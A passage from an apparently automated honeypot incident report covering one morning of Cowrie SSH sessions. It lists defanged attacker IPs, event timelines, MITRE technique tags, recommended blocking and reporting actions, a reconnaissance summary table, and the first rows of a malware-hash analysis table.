| `2026-07-21 08:13:33` | `cowrie.command.failed` |
| `2026-07-21 08:13:33` | `cowrie.log.closed` |
| `2026-07-21 08:13:34` | `cowrie.session.params` |
| `2026-07-21 08:13:34` | `cowrie.command.input` |
| `2026-07-21 08:13:34` | `cowrie.log.closed` |
| `2026-07-21 08:13:35` | `cowrie.session.params` |
| `2026-07-21 08:13:35` | `cowrie.command.input` |
| `2026-07-21 08:13:36` | `cowrie.log.closed` |
| `2026-07-21 08:13:37` | `cowrie.session.params` |
| `2026-07-21 08:13:37` | `cowrie.command.input` |
| `2026-07-21 08:13:37` | `cowrie.log.closed` |
| `2026-07-21 08:13:38` | `cowrie.session.params` |
| `2026-07-21 08:13:38` | `cowrie.command.input` |
| `2026-07-21 08:13:38` | `cowrie.log.closed` |
| `2026-07-21 08:13:39` | `cowrie.session.params` |
| `2026-07-21 08:13:39` | `cowrie.command.input` |
| `2026-07-21 08:13:39` | `cowrie.log.closed` |
| `2026-07-21 08:13:40` | `cowrie.session.params` |
| `2026-07-21 08:13:40` | `cowrie.command.input` |
| `2026-07-21 08:13:40` | `cowrie.log.closed` |
| `2026-07-21 08:13:41` | `cowrie.session.params` |
| `2026-07-21 08:13:41` | `cowrie.command.input` |
| `2026-07-21 08:13:42` | `cowrie.log.closed` |
| `2026-07-21 08:13:43` | `cowrie.session.params` |
| `2026-07-21 08:13:43` | `cowrie.command.input` |
| `2026-07-21 08:13:43` | `cowrie.log.closed` |
| `2026-07-21 08:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.116.26[.]179` to AbuseIPDB if not already reported
- [ ] Block `220.116.26[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d943ff9f7f6a

| Field | Detail |
|---|---|
| **Source IP** | `183.196.144[.]45` |
| **First Seen** | 2026-07-21 08:20 |
| **Last Seen** | 2026-07-21 08:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:20:13` | `cowrie.session.connect` |
| `2026-07-21 08:20:13` | `cowrie.client.version` |
| `2026-07-21 08:20:13` | `cowrie.client.kex` |
| `2026-07-21 08:20:15` | `cowrie.login.success` |
| `2026-07-21 08:20:16` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.196.144[.]45` to AbuseIPDB if not already reported
- [ ] Block `183.196.144[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122de217ef7e

| Field | Detail |
|---|---|
| **Source IP** | `164.164.117[.]23` |
| **First Seen** | 2026-07-21 08:21 |
| **Last Seen** | 2026-07-21 08:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:21:00` | `cowrie.session.connect` |
| `2026-07-21 08:21:01` | `cowrie.client.version` |
| `2026-07-21 08:21:01` | `cowrie.client.kex` |
| `2026-07-21 08:21:03` | `cowrie.login.success` |
| `2026-07-21 08:21:04` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.164.117[.]23` to AbuseIPDB if not already reported
- [ ] Block `164.164.117[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc3b521729b7

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-07-21 08:21 |
| **Last Seen** | 2026-07-21 08:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:21:10` | `cowrie.session.connect` |
| `2026-07-21 08:21:11` | `cowrie.client.version` |
| `2026-07-21 08:21:11` | `cowrie.client.kex` |
| `2026-07-21 08:21:13` | `cowrie.login.success` |
| `2026-07-21 08:21:14` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e07ae4e56402

| Field | Detail |
|---|---|
| **Source IP** | `207.254.22[.]207` |
| **First Seen** | 2026-07-21 08:29 |
| **Last Seen** | 2026-07-21 08:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:29:31` | `cowrie.session.connect` |
| `2026-07-21 08:29:31` | `cowrie.client.version` |
| `2026-07-21 08:29:31` | `cowrie.client.kex` |
| `2026-07-21 08:29:32` | `cowrie.login.success` |
| `2026-07-21 08:29:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.22[.]207` to AbuseIPDB if not already reported
- [ ] Block `207.254.22[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8edc1a92c66f

| Field | Detail |
|---|---|
| **Source IP** | `66.228.53[.]204` |
| **First Seen** | 2026-07-21 08:29 |
| **Last Seen** | 2026-07-21 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:29:51` | `cowrie.session.connect` |
| `2026-07-21 08:29:51` | `cowrie.login.success` |
| `2026-07-21 08:29:51` | `cowrie.session.params` |
| `2026-07-21 08:29:51` | `cowrie.command.input` |
| `2026-07-21 08:29:51` | `cowrie.command.input` |
| `2026-07-21 08:29:51` | `cowrie.command.failed` |
| `2026-07-21 08:29:51` | `cowrie.command.input` |
| `2026-07-21 08:29:51` | `cowrie.command.failed` |
| `2026-07-21 08:29:51` | `cowrie.command.input` |
| `2026-07-21 08:29:51` | `cowrie.log.closed` |
| `2026-07-21 08:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.53[.]204` to AbuseIPDB if not already reported
- [ ] Block `66.228.53[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5c3c8152b7f

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-07-21 08:29 |
| **Last Seen** | 2026-07-21 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:29:54` | `cowrie.session.connect` |
| `2026-07-21 08:29:54` | `cowrie.client.version` |
| `2026-07-21 08:29:54` | `cowrie.client.kex` |
| `2026-07-21 08:29:54` | `cowrie.login.success` |
| `2026-07-21 08:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc41749fdb5

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-21 08:29 |
| **Last Seen** | 2026-07-21 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:29:54` | `cowrie.session.connect` |
| `2026-07-21 08:29:54` | `cowrie.client.version` |
| `2026-07-21 08:29:54` | `cowrie.client.kex` |
| `2026-07-21 08:29:54` | `cowrie.login.success` |
| `2026-07-21 08:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da423df7a84

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-07-21 08:32 |
| **Last Seen** | 2026-07-21 08:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:32:59` | `cowrie.session.connect` |
| `2026-07-21 08:33:00` | `cowrie.client.version` |
| `2026-07-21 08:33:00` | `cowrie.client.kex` |
| `2026-07-21 08:33:02` | `cowrie.login.success` |
| `2026-07-21 08:33:03` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeba16ea28c4

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-21 08:33 |
| **Last Seen** | 2026-07-21 08:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:33:09` | `cowrie.session.connect` |
| `2026-07-21 08:33:10` | `cowrie.client.version` |
| `2026-07-21 08:33:10` | `cowrie.client.kex` |
| `2026-07-21 08:33:13` | `cowrie.login.success` |
| `2026-07-21 08:33:15` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a121b149707d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 08:35 |
| **Last Seen** | 2026-07-21 08:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:35:52` | `cowrie.session.connect` |
| `2026-07-21 08:35:52` | `cowrie.client.version` |
| `2026-07-21 08:35:52` | `cowrie.client.kex` |
| `2026-07-21 08:35:52` | `cowrie.login.success` |
| `2026-07-21 08:35:52` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:35:52` | `cowrie.direct-tcpip.data` |
| `2026-07-21 08:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84afc4918c10

| Field | Detail |
|---|---|
| **Source IP** | `185.81.94[.]58` |
| **First Seen** | 2026-07-21 08:36 |
| **Last Seen** | 2026-07-21 08:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:36:22` | `cowrie.session.connect` |
| `2026-07-21 08:36:23` | `cowrie.client.version` |
| `2026-07-21 08:36:23` | `cowrie.client.kex` |
| `2026-07-21 08:36:24` | `cowrie.login.success` |
| `2026-07-21 08:36:24` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.81.94[.]58` to AbuseIPDB if not already reported
- [ ] Block `185.81.94[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb81f54e6748

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-07-21 08:36 |
| **Last Seen** | 2026-07-21 08:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:36:29` | `cowrie.session.connect` |
| `2026-07-21 08:36:30` | `cowrie.client.version` |
| `2026-07-21 08:36:30` | `cowrie.client.kex` |
| `2026-07-21 08:36:32` | `cowrie.login.success` |
| `2026-07-21 08:36:32` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e38c3bc18c2

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]27` |
| **First Seen** | 2026-07-21 08:45 |
| **Last Seen** | 2026-07-21 08:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:45:51` | `cowrie.session.connect` |
| `2026-07-21 08:45:52` | `cowrie.client.version` |
| `2026-07-21 08:45:52` | `cowrie.client.kex` |
| `2026-07-21 08:46:01` | `cowrie.login.success` |
| `2026-07-21 08:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]27` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ba9e1148a9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 08:46 |
| **Last Seen** | 2026-07-21 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:46:00` | `cowrie.session.connect` |
| `2026-07-21 08:46:00` | `cowrie.client.version` |
| `2026-07-21 08:46:00` | `cowrie.client.kex` |
| `2026-07-21 08:46:00` | `cowrie.login.success` |
| `2026-07-21 08:46:01` | `cowrie.session.params` |
| `2026-07-21 08:46:01` | `cowrie.command.input` |
| `2026-07-21 08:46:01` | `cowrie.log.closed` |
| `2026-07-21 08:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10736ca5caf0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 08:53 |
| **Last Seen** | 2026-07-21 08:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:53:23` | `cowrie.session.connect` |
| `2026-07-21 08:53:24` | `cowrie.client.version` |
| `2026-07-21 08:53:24` | `cowrie.client.kex` |
| `2026-07-21 08:53:25` | `cowrie.login.success` |
| `2026-07-21 08:53:27` | `cowrie.session.params` |
| `2026-07-21 08:53:27` | `cowrie.command.input` |
| `2026-07-21 08:53:28` | `cowrie.log.closed` |
| `2026-07-21 08:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ff52a8aaadf

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-07-21 08:54 |
| **Last Seen** | 2026-07-21 08:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:54:18` | `cowrie.session.connect` |
| `2026-07-21 08:54:19` | `cowrie.client.version` |
| `2026-07-21 08:54:19` | `cowrie.client.kex` |
| `2026-07-21 08:54:21` | `cowrie.login.success` |
| `2026-07-21 08:54:22` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11275d32fb1c

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-07-21 08:54 |
| **Last Seen** | 2026-07-21 08:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 08:54:27` | `cowrie.session.connect` |
| `2026-07-21 08:54:28` | `cowrie.client.version` |
| `2026-07-21 08:54:28` | `cowrie.client.kex` |
| `2026-07-21 08:54:29` | `cowrie.login.success` |
| `2026-07-21 08:54:29` | `cowrie.direct-tcpip.request` |
| `2026-07-21 08:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **9** | 2026-07-21 05:11 | 2026-07-21 08:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.34.130[.]254` | **9** | 2026-07-21 07:05 | 2026-07-21 07:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.240.219[.]146` | **4** | 2026-07-21 05:19 | 2026-07-21 05:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **3** | 2026-07-21 06:13 | 2026-07-21 08:12 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-07-21 08:40 | 2026-07-21 08:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-21 07:28 | 2026-07-21 07:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-21 05:43 | 2026-07-21 05:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | **3** | 2026-07-21 05:57 | 2026-07-21 05:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-21 08:18 | 2026-07-21 08:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-21 07:01 | 2026-07-21 07:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]193` | **2** | 2026-07-21 06:55 | 2026-07-21 06:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]97` | **2** | 2026-07-21 06:28 | 2026-07-21 06:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.12.240[.]74` | **2** | 2026-07-21 05:39 | 2026-07-21 05:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `223.166.28[.]162` | **2** | 2026-07-21 08:32 | 2026-07-21 08:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-07-21 07:35 | 2026-07-21 07:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.236.165[.]237` | **2** | 2026-07-21 04:56 | 2026-07-21 04:57 | 1m | 0 | `T1592` | 🟢 LOW |
| `48.217.84[.]135` | **2** | 2026-07-21 05:14 | 2026-07-21 05:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]112` | **2** | 2026-07-21 07:50 | 2026-07-21 07:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.181[.]87` | 1 | 2026-07-21 07:00 | 2026-07-21 07:01 | 12s | 0 | `T1592` | 🟢 LOW |
| `112.26.101[.]76` | 1 | 2026-07-21 06:08 | 2026-07-21 06:08 | 5s | 0 | `T1592` | 🟢 LOW |
| `115.191.16[.]236` | 1 | 2026-07-21 06:35 | 2026-07-21 06:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.34.210[.]196` | 1 | 2026-07-21 05:43 | 2026-07-21 05:43 | 14s | 0 | `T1592` | 🟢 LOW |
| `120.48.134[.]186` | 1 | 2026-07-21 08:16 | 2026-07-21 08:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.67[.]104` | 1 | 2026-07-21 06:26 | 2026-07-21 06:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.185.96[.]113` | 1 | 2026-07-21 07:31 | 2026-07-21 07:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-07-21 06:38 | 2026-07-21 06:38 | 2s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-07-21 07:21 | 2026-07-21 07:21 | 31s | 0 | `T1592` | 🟢 LOW |
| `179.61.192[.]156` | 1 | 2026-07-21 06:52 | 2026-07-21 06:52 | 31s | 0 | `T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-07-21 08:33 | 2026-07-21 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.100.84[.]174` | 1 | 2026-07-21 05:14 | 2026-07-21 05:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-07-21 05:54 | 2026-07-21 05:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-07-21 07:06 | 2026-07-21 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]195` | 1 | 2026-07-21 05:48 | 2026-07-21 05:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.251.193[.]6` | 1 | 2026-07-21 07:43 | 2026-07-21 07:44 | 12s | 0 | `T1592` | 🟢 LOW |
| `202.84.34[.]85` | 1 | 2026-07-21 05:00 | 2026-07-21 05:01 | 52s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]81` | 1 | 2026-07-21 07:01 | 2026-07-21 07:01 | 30s | 0 | `T1592` | 🟢 LOW |
| `206.189.5[.]249` | 1 | 2026-07-21 05:00 | 2026-07-21 05:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.60.195[.]143` | 1 | 2026-07-21 07:00 | 2026-07-21 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.83.114[.]88` | 1 | 2026-07-21 05:41 | 2026-07-21 05:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.76.235[.]60` | 1 | 2026-07-21 07:04 | 2026-07-21 07:04 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-21 07:07 | 2026-07-21 07:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.167.24[.]40` | 1 | 2026-07-21 06:17 | 2026-07-21 06:18 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-07-21 05:39 | 2026-07-21 05:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-07-21 07:45 | 2026-07-21 07:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-07-21 06:38 | 2026-07-21 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.239.107[.]57` | 1 | 2026-07-21 05:11 | 2026-07-21 05:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]250` | 1 | 2026-07-21 05:25 | 2026-07-21 05:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-21 07:50 | 2026-07-21 07:51 | 41s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]80` | 1 | 2026-07-21 05:33 | 2026-07-21 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-07-21 06:37 | 2026-07-21 06:37 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-21 08:27 | 2026-07-21 08:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]204` | 1 | 2026-07-21 08:29 | 2026-07-21 08:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-07-21 08:40 | 2026-07-21 08:41 | 3s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]43` | 1 | 2026-07-21 05:47 | 2026-07-21 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-21 07:00 | 2026-07-21 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.174.160[.]179` | 1 | 2026-07-21 08:25 | 2026-07-21 08:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-07-21 05:43 | 2026-07-21 05:45 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
